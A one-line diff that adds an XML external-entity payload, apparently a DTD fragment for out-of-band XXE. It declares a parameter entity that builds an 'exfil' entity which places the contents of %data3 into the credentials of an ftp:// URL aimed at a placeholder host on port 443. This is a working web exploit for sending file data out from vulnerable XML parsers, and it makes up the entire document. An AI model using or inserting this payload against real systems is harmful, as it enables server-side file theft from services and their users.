@@ -1,0 +1,1 @@
+<!ENTITY % param2 "<!ENTITY &#x25; exfil SYSTEM 'ftp://x:%data3;@0.0.0.0:443/'>">
